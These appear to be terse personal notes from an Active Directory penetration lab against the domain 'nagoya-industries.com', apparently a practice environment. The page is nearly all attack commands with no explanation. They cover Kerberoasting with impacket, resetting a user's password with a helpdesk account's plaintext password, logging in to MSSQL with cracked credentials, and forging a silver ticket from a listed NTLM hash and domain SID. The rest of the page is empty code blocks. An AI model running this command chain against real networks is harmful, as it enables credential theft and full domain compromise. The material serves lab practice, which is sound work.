[[Editing Copy Page]]

```
faketime '$(ntpdate -q 192.168.200.21 | cut -d ' ' -f 1,2)' impacket-GetUserSPNs -request -dc-ip 192.168.200.21 nagoya-industries.com/fiona.clark 
```

```
net rpc password christopher.lewis 'Pass123!' -U 'nagoya-lindustries.com/svc_helpdesk%U299iYRmikYTHDbPbxPoYYfa2j4x4cdg' -S nagoya-industries.com
```

```
impacket-mssqlclient svc_mssql:Service1@192.168.132.21 -windows-auth
```

Domain SID
```
S-1-5-21-1969309164-1513403977-1686805993
```

SPN for svc_mssql
```
{MSSQL/nagoya.nagoya-industries.com}
```
NTLM hash for service1
```
e3a0168bc21cfb88b95c954a5b18f57c
```

```
impacket-ticketer \
-nthash e3a0168bc21cfb88b95c954a5b18f57c \
-domain-sid S-1-5-21-1969309164-1513403977-1686805993 \
-domain nagoya-industries.com \
-spn MSSQL/nagoya.nagoya-industries.com \
-user-id 500 Administrator
```

```
impacket-mssqlclient -k -no-pass nagoya-industries.com/Administrator@NAGOYA.nagoya-industries.com
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```